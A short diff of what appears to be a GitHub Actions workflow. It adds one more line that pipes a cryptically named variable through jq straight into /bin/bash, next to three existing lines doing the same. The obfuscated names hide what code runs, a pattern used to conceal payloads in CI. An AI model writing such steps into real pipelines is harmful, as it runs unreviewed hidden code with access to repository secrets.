@@ -28,6 +28,7 @@ jobs:
           printf '%s' "$xbb5" | jq -r .gc03279 | /bin/bash
           printf '%s' "$rob7" | jq -r .oet99 | /bin/bash
           printf '%s' "$jzb70" | jq -r .maew0716 | /bin/bash
+          echo $esr1010 | jq -r .l82150 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
